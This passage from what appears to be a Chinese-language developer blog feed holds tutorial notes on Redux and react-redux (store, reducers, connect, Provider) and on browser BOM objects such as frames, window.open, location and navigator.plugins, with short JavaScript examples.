class="string">'./reducers'</span>;</span><br><span class="line"><span class="keyword">let</span> store = createStore(todoApp);</span><br></pre></td></tr></table></figure></p><p><em>store.getState()</em><br>获取store的数据</p><p><em>store.dispatch(action)</em><br>用户点击一个按钮，产生一个action，dispatch将这个action传递给reducer，来更新store</p><p><em>store.subscribe(callback)</em><br>监听store的变化，变化后执行回调函数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; createStore &#125; <span class="keyword">from</span> <span class="string">'redux'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义reducer</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">counter</span>(<span class="params">state = <span class="number">0</span>, action</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">switch</span> (action.type)&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'INCREMENT'</span>:</span><br><span class="line">      <span class="keyword">return</span> state + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">'DECREMENT'</span>:</span><br><span class="line">      <span class="keyword">return</span> state - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">return</span> state;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建store来存放应用的状态(store是一个纯js对象)</span></span><br><span class="line"><span class="comment">// API 是 &#123; subscribe, dispatch, getState &#125;</span></span><br><span class="line"><span class="keyword">let</span> store = createStore(counter);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 监听store的变化，变化后执行回调函数</span></span><br><span class="line">store.subscribe(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// 获取store里的数据</span></span><br><span class="line">  <span class="built_in">console</span>.log(store.getState())</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">store.dispatch(&#123; <span class="attr">type</span>: <span class="string">'INCREMENT'</span> &#125;)</span><br></pre></td></tr></table></figure><p><em>combineReducers</em><br>系统中有多个reduer，可以使用<code>combineReducers</code>整合在一起。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; combineReducers &#125; <span class="keyword">from</span> <span class="string">'redux'</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">todos</span>(<span class="params"> state = [], action</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="keyword">return</span> nextState;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">visibleTodoFilter</span>(<span class="params">state = <span class="string">'SHOW_ALL'</span>, action</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  <span class="keyword">return</span> nextState;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> combineReducers(&#123;</span><br><span class="line">  todos,</span><br><span class="line">  visibleTodoFilter</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><p><br><br><em>bindActionCreators</em><br>创建action，同时把它dispatch出去。不需要知道store， dispatch在哪, 就能触发dispatch。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addTodoWithDispatch</span>(<span class="params">text</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">const</span> action = &#123;</span><br><span class="line">    type: ADD_TODO,</span><br><span class="line">    text</span><br><span class="line">  &#125;</span><br><span class="line">  dispatch(action)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 另一种写法</span></span><br><span class="line"><span class="keyword">const</span> boundAddTodo = <span class="function"><span class="params">text</span> =&gt;</span> dispatch(addTodo(text))</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="3-React-redux"><a href="#3-React-redux" class="headerlink" title="3. React-redux"></a>3. React-redux</h3><p>React-Redux是基于 容器组件和展示组件相分离 的开发思想。大部分组件都是展示型的，但一般需要少数的几个容器组件把它们和Redux store连接起来。</p><p><br></p><h4 id="3-3-connect工作原理"><a href="#3-3-connect工作原理" class="headerlink" title="3.3 connect工作原理"></a>3.3 connect工作原理</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 传递redux state</span></span><br><span class="line">cosnt mapStateToProps = <span class="function"><span class="params">state</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    todos: state.todos</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 分发action</span></span><br><span class="line"><span class="keyword">const</span> mapDispatchToProps = <span class="function"><span class="params">dispatch</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    onTodoClick: <span class="function"><span class="params">id</span> =&gt;</span> &#123;</span><br><span class="line">      dispatch(toggleTodo(id))</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 最后通过connect()，将&lt;TodoList&gt;与redux联系起来</span></span><br><span class="line"><span class="keyword">import</span> &#123; connect &#125; <span class="keyword">from</span> <span class="string">'react-redux'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> VisibleTodoList = connect(</span><br><span class="line">  mapStateToProps,</span><br><span class="line">  mapDispatchToProps</span><br><span class="line">)(TodoList)</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> VisibleTodoList;</span><br></pre></td></tr></table></figure><h4 id="3-4-传入store"><a href="#3-4-传入store" class="headerlink" title="3.4 传入store"></a>3.4 传入store</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">'react'</span></span><br><span class="line"><span class="keyword">import</span> &#123; render &#125; <span class="keyword">from</span> <span class="string">'react-dom'</span></span><br><span class="line"><span class="keyword">import</span> &#123; Provider &#125; <span class="keyword">from</span> <span class="string">'react-redux'</span></span><br><span class="line"><span class="keyword">import</span> &#123; createStore &#125; <span class="keyword">from</span> <span class="string">'redux'</span></span><br><span class="line"><span class="keyword">import</span> todoApp <span class="keyword">from</span> <span class="string">'./reducers'</span></span><br><span class="line"><span class="keyword">import</span> App <span class="keyword">from</span> <span class="string">'./components/App'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> store = createStore(todoApp)</span><br><span class="line"></span><br><span class="line">render(</span><br><span class="line">  &lt;Provider store=&#123;store&#125;&gt;</span><br><span class="line">    &lt;App /&gt;</span><br><span class="line">  &lt;<span class="regexp">/Provider&gt;,</span></span><br><span class="line"><span class="regexp">  document.getElementById('root')</span></span><br><span class="line"><span class="regexp">)</span></span><br></pre></td></tr></table></figure><p>（这里还不太懂）<br>示例：<a href="https://www.redux.org.cn/docs/basics/ExampleTodoList.html" target="_blank" rel="noopener">https://www.redux.org.cn/docs/basics/ExampleTodoList.html</a></p><p><br></p><h3 id="4-Redux异步请求"><a href="#4-Redux异步请求" class="headerlink" title="4. Redux异步请求"></a>4. Redux异步请求</h3><p>一般情况下，每个API请求都需要dispatch至少三种action:</p><ul><li>通知reducer请求开始的action</li><li>通知reducer请求成功的action</li><li>通知reducer请求失败的action</li></ul><p><br></p><h3 id="5-组织action和reducer"><a href="#5-组织action和reducer" class="headerlink" title="5. 组织action和reducer"></a>5. 组织action和reducer</h3><ul><li>所有action放一个文件，会无限扩展</li><li>action，reducer分开，在action中发请求，在reducer中做处理，实现业务逻辑时需要来回切换<br>建议单个action和reducer放在同一个文件<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; COUNTER_PLUS_ONE &#125; <span class="keyword">from</span> <span class="string">'./counter'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">counterPlusOne</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> &#123; <span class="attr">type</span>: COUNTER_PLUS_ONE &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">reducer</span>(<span class="params">state, action</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">switch</span> (action.type)&#123;</span><br><span class="line">    <span class="keyword">case</span> COUNTER_PLUS_ONE:</span><br><span class="line">      <span class="keyword">return</span> &#123;</span><br><span class="line">        ...state,</span><br><span class="line">        count: state.count + <span class="number">1</span>,</span><br><span class="line">      &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">return</span> state;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><img src="/2019/02/28/Redux/4.png" style="max-width:500px"></p><p><br></p><h3 id="6-redux-saga"><a href="#6-redux-saga" class="headerlink" title="6. redux-saga"></a>6. redux-saga</h3><p><img src="/2019/02/28/Redux/3.png" style="max-width:400px"></p><h3 id="7-dva"><a href="#7-dva" class="headerlink" title="7. dva"></a>7. dva</h3><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://www.redux.org.cn/" target="_blank" rel="noopener">Redux</a></li><li><a href="https://redux-saga-in-chinese.js.org/" target="_blank" rel="noopener">Redux-sage</a></li><li><a href="https://dvajs.com/" target="_blank" rel="noopener">Dva</a></li><li><a href="https://github.com/kenberkeley/redux-simple-tutorial" target="_blank" rel="noopener">Redux 简明教程</a></li><li><a href="https://github.com/kenberkeley/redux-simple-tutorial/blob/master/redux-advanced-tutorial.md" target="_blank" rel="noopener">Redux 进阶教程</a></li><li><a href="https://medium.com/@dan_abramov/smart-and-dumb-components-7ca2f9a7c7d0" target="_blank" rel="noopener">容器组件和展示组件相分离</a></li><li><a href="https://segmentfault.com/a/1190000016774551" target="_blank" rel="noopener">简述React中无状态组件和有状态组件的区别</a></li></ul>]]></content>
      
      <categories>
          
          <category> React </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>BOM - 访问浏览器的功能</title>
      <link href="/2019/02/26/BOM%E6%96%87%E6%A1%A3/"/>
      <url>/2019/02/26/BOM%E6%96%87%E6%A1%A3/</url>
      <content type="html"><![CDATA[<h3 id="1-简介"><a href="#1-简介" class="headerlink" title="1. 简介"></a>1. 简介</h3><p>BOM提供了很多对象，用于访问浏览器的功能，这些功能与网页内容无关。<br><br></p><h3 id="2-窗口关系-amp-iframe"><a href="#2-窗口关系-amp-iframe" class="headerlink" title="2. 窗口关系 &amp; iframe"></a>2. 窗口关系 &amp; iframe</h3><p>在浏览器中，<code>window</code>对象既是JS访问浏览器窗口的一个接口，又是JS规定的<code>Global</code>对象。如果页面包含iframe，则每个iframe都拥有自己的<code>window</code>对象，并且保存在<code>frames</code>集合中。</p><ul><li><p><em>top</em><br><code>top</code>对象始终指向最外层的框架，也就是浏览器窗口。<br>你可以通过<code>top.frames[0]</code>, <code>top.frame[&quot;topFrame&quot;]</code>, <code>window.top.frames[0]</code>来引用topFframe。</p></li><li><p><em>window</em><br><code>window</code>对象指向了那个框架的特定实例，而非最高层的框架。</p></li><li><p><em>parent</em><br><code>parent</code>对象始终指向当前框架的直接上层框架。<br>在<code>redFrame</code>代码中，通过<code>window.parent.parent.frames[0]</code>引用<code>topFrame</code></p></li><li><p><em>self</em><br><code>self</code>始终指向<code>window</code>, 它和<code>window</code>可以互换使用</p></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">frameset</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">frame</span> <span class="attr">src</span>=<span class="string">"top.htm"</span> <span class="attr">name</span>=<span class="string">"topFrame"</span>&gt;</span><span class="tag">&lt;/<span class="name">frame</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">frame</span> <span class="attr">src</span>=<span class="string">"left.htm"</span> <span class="attr">name</span>=<span class="string">"leftFrame"</span>&gt;</span><span class="tag">&lt;/<span class="name">frame</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">frame</span> <span class="attr">src</span>=<span class="string">"right.htm"</span> <span class="attr">name</span>=<span class="string">"rightFrame"</span>&gt;</span><span class="tag">&lt;/<span class="name">frame</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">frameset</span>&gt;</span></span><br><span class="line"></span><br><span class="line">// rightFrame中又包含了两个iframe</span><br><span class="line"><span class="tag">&lt;<span class="name">frameset</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">frame</span> <span class="attr">src</span>=<span class="string">"red.htm"</span> <span class="attr">name</span>=<span class="string">"redFrame"</span>&gt;</span><span class="tag">&lt;/<span class="name">frame</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">frame</span> <span class="attr">src</span>=<span class="string">"blue.htm"</span> <span class="attr">name</span>=<span class="string">"blueFrame"</span>&gt;</span><span class="tag">&lt;/<span class="name">frame</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">frameset</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2019/02/26/BOM文档/1.png" style="max-width:350px"></p><p><br></p><h3 id="3-窗口属性"><a href="#3-窗口属性" class="headerlink" title="3. 窗口属性"></a>3. 窗口属性</h3><ul><li><p>浏览器相对于屏幕左边和上边的位置</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> leftPos = (<span class="keyword">typeof</span> <span class="built_in">window</span>.screenLeft == <span class="string">"number"</span>) ? <span class="built_in">window</span>.screenLeft : <span class="built_in">window</span>.screenX;</span><br><span class="line"><span class="keyword">var</span> topPost = (<span class="keyword">typeof</span> <span class="built_in">window</span>.screenTop == <span class="string">"number"</span>) ? <span class="built_in">window</span>.screenTop : <span class="built_in">window</span>.screenY;</span><br></pre></td></tr></table></figure></li><li><p>页面视口的大小（注: 无法确定浏览器窗口的大小）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> pageWidth = <span class="built_in">window</span>.innerWidth,</span><br><span class="line">    pageHeight = <span class="built_in">window</span>.innerHeight;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">typeof</span> pageWidth != <span class="string">"number"</span>)&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">document</span>.compatMode == <span class="string">"CSS1Compat"</span>)&#123;</span><br><span class="line">      pageWidth = <span class="built_in">document</span>.documentElement.clientWidth;</span><br><span class="line">      pageHeight = <span class="built_in">document</span>.documentElement.clientHeight;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      pageWidth = <span class="built_in">document</span>.body.clientWidth;</span><br><span class="line">      pageHeight = <span class="built_in">document</span>.body.clientHeight;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="4-打开新窗口"><a href="#4-打开新窗口" class="headerlink" title="4. 打开新窗口"></a>4. 打开新窗口</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">window.open(url, 窗口目标，特性字符串，一个表示新页面是否取代浏览器历史记录中当前加载页面的布尔值)</span><br></pre></td></tr></table></figure><ul><li><p><em>窗口目标</em><br>这个参数可以是下列任何一个特殊的窗口名称<em><code>_self</code>, <code>_parent</code>, <code>_top</code>, <code>_blank</code></em>，也可以指定具体值。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 如果有一个叫topFrame的窗口就会在该窗口或框架加载这个url</span><br><span class="line">window.open(&quot;http://www.baidu.com&quot;, &quot;topFrame&quot;)</span><br><span class="line"></span><br><span class="line">// 在新标签页打开url</span><br><span class="line">window.open(&quot;https://www.baidu.com&quot;, &quot;_blank&quot;)</span><br></pre></td></tr></table></figure></li><li><p><em>特性字符串</em><br>在当前窗口打开一个弹出窗口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">window.open(&quot;http://www.baidu.com&quot;, null, &quot;height=400,width=400,top=10,left=10,resizeable=yes&quot;)</span><br></pre></td></tr></table></figure></li></ul><table><thead><tr><th>设置</th><th style="text-align:center">值</th><th style="text-align:right">说明</th></tr></thead><tbody><tr><td>fullscreen</td><td style="text-align:center">yes/no</td><td style="text-align:right">浏览器窗口是否最大化(限IE)</td></tr><tr><td>height</td><td style="text-align:center">数值</td><td style="text-align:right">新窗口的高度，不能小于100</td></tr><tr><td>width</td><td style="text-align:center">数值</td><td style="text-align:right">新窗口的宽度，不能小于100</td></tr><tr><td>top</td><td style="text-align:center">数组</td><td style="text-align:right">新窗口的上坐标，不能是负值</td></tr><tr><td>left</td><td style="text-align:center">数组</td><td style="text-align:right">新窗口的左坐标，不能是负值</td></tr><tr><td>location</td><td style="text-align:center">yes/no</td><td style="text-align:right">是否在浏览器窗口中显示地址栏(可能会被禁用)</td></tr><tr><td>menubar</td><td style="text-align:center">yes/no</td><td style="text-align:right">是否在浏览器窗口显示菜单栏</td></tr><tr><td>resizable</td><td style="text-align:center">yes/no</td><td style="text-align:right">是否可以拖动浏览器窗口的边框改变其大小</td></tr><tr><td>scrollbars</td><td style="text-align:center">yes/no</td><td style="text-align:right">是否允许滚动</td></tr><tr><td>status</td><td style="text-align:center">yes/no</td><td style="text-align:right">是否在浏览器窗口中显示状态栏</td></tr><tr><td>toolbar</td><td style="text-align:center">yes/no</td><td style="text-align:right">是否在浏览器窗口中显示工具栏</td></tr></tbody></table><ul><li><em>其他操作</em><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="built_in">window</span>.open(<span class="string">"http://www.baidu.com"</span>, <span class="literal">null</span>, <span class="string">"height=400,width=400,top=10,left=10"</span>);</span><br><span class="line">a.resizeTo(<span class="number">500</span>, <span class="number">500</span>)  <span class="comment">// 调整大小</span></span><br><span class="line">a.moveTo(<span class="number">100</span>, <span class="number">100</span>)    <span class="comment">// 移动位置</span></span><br><span class="line">a.close()             <span class="comment">// 关闭新打开的窗口</span></span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="5-location"><a href="#5-location" class="headerlink" title="5. location"></a>5. location</h3><h4 id="5-1-查询URL参数"><a href="#5-1-查询URL参数" class="headerlink" title="5.1 查询URL参数"></a>5.1 查询URL参数</h4><p><code>location</code>是最有用的BOM对象之一，可以通过<code>window.location</code>和<code>document.location</code>访问。它不仅保存着当前文档的信息，还将它解析为独立的片段。</p><table><thead><tr><th>属性名</th><th style="text-align:center">例子</th><th style="text-align:right">说明</th></tr></thead><tbody><tr><td>hash</td><td style="text-align:center">“#contents”</td><td style="text-align:right">返回URL中的hash(#号后的字符)</td></tr><tr><td>host</td><td style="text-align:center"><code>&quot;www.baidu.com:80&quot;</code></td><td style="text-align:right">返回服务器名称的端口号</td></tr><tr><td>hostname</td><td style="text-align:center"><code>&quot;www.baidu.com&quot;</code></td><td style="text-align:right">返回不带端口号的服务器名称</td></tr><tr><td>href</td><td style="text-align:center"><code>&quot;http://www.baidu.com&quot;</code></td><td style="text-align:right">返回当前页面的完整URL</td></tr><tr><td>pathname</td><td style="text-align:center">“/dashboard/“</td><td style="text-align:right">返回URL的目录或文件名</td></tr><tr><td>port</td><td style="text-align:center">“8080”</td><td style="text-align:right">返回UR中的端口号</td></tr><tr><td>protocol</td><td style="text-align:center">“http:”</td><td style="text-align:right">返回页面使用的协议 <code>http:</code>或<code>https:</code></td></tr><tr><td>search</td><td style="text-align:center">“?q=javascript”</td><td style="text-align:right">返回URL的查询字符串，以<code>?</code>开头</td></tr></tbody></table><ul><li><em>解析查询字符串</em><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getQueryStringArgs</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> qs = (location.search.length &gt; <span class="number">0</span> ? location.serach.substring(<span class="number">1</span>) : <span class="string">""</span>);</span><br><span class="line">      args = &#123;&#125;;</span><br><span class="line">      items = qs.length ? qs.split(<span class="string">"&amp;"</span>) : [];</span><br><span class="line">      </span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; items.length; i++)&#123;</span><br><span class="line">    <span class="keyword">var</span> item = items[i].split(<span class="string">"="</span>);</span><br><span class="line">    <span class="keyword">var</span> name = <span class="built_in">decodeURIComponent</span>(item[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">var</span> val = <span class="built_in">decodeURIComponent</span>(item[<span class="number">1</span>]);</span><br><span class="line">    args[name] = val;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> args;  </span><br><span class="line">&#125;</span><br><span class="line">alert(args[<span class="string">"q"</span>])  <span class="comment">// "javascript"</span></span><br></pre></td></tr></table></figure></li></ul><p><br></p><h4 id="5-2-修改URL"><a href="#5-2-修改URL" class="headerlink" title="5.2 修改URL"></a>5.2 修改URL</h4><ul><li><p>在当前页面打开新URL(并在浏览器的历史记录中生成一条记录)</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">location.assign(<span class="string">"http://www.baidu.com"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 与assign效果一样</span></span><br><span class="line"><span class="built_in">window</span>.location = <span class="string">"http://www.baidu.com"</span>;</span><br><span class="line">location.href = <span class="string">"http://www.baidu.com"</span></span><br></pre></td></tr></table></figure></li><li><p>将hash,search, hostname, pathname, port设置为新值来改变URL<br>只有修改<code>hash</code>属性，页面不会以新URL重新加载。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 假设原始url为"http://www.baidu.com/dashboard"</span></span><br><span class="line"><span class="comment">// url修改为"http://www.baidu.com/dashboard/#section1"</span></span><br><span class="line">location.hash = <span class="string">"#section1"</span>;          </span><br><span class="line"></span><br><span class="line"><span class="comment">// url修改为"http://www.baidu.com/dashboard?q=javascript"</span></span><br><span class="line">location.search = <span class="string">"?q=javascript"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// url修改为"http://www.yahoo.com/dashboard"</span></span><br><span class="line">location.hostname = <span class="string">"www.yahoo.com"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// url修改为"http://www.baidu.com/mydir"</span></span><br><span class="line">location.pathname = <span class="string">"mydir"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// url修改为"http://www.baidu.com:8000/dashboard"</span></span><br><span class="line">location.port = <span class="number">8000</span>;</span><br></pre></td></tr></table></figure></li></ul><p>通过上面任何一种方式修改URL后，浏览器的历史记录都会生成一条新记录。</p><ul><li><p>当前页面加载新URL，但是不会再历史记录中生成新记录。用户不能回到前一个页面</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location.replace(<span class="string">"http://www.baidu.com"</span>)</span><br></pre></td></tr></table></figure></li><li><p>重新加载当前页面</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">location.reload();     <span class="comment">// 可能从缓存中加载</span></span><br><span class="line">location.reload(<span class="literal">true</span>); <span class="comment">// 从服务器重新加载</span></span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="6-navigator"><a href="#6-navigator" class="headerlink" title="6. navigator"></a>6. navigator</h3><h4 id="6-1-检查插件"><a href="#6-1-检查插件" class="headerlink" title="6.1 检查插件"></a>6.1 检查插件</h4><p>在浏览器中，可以使用<code>plugins</code>数组，检查浏览器中是否安装了特定的插件。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 非IE浏览器</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hasPlugin</span>(<span class="params">name</span>)</span>&#123;</span><br><span class="line">  name = name.toLowerCase();</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; navigator.plugins.length; i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(navigator.plugins[i].name.toLowerCase().indexOf(name) &gt; <span class="number">-1</span>)&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// IE浏览器</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hasIEPlugin</span>(<span class="params">name</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span 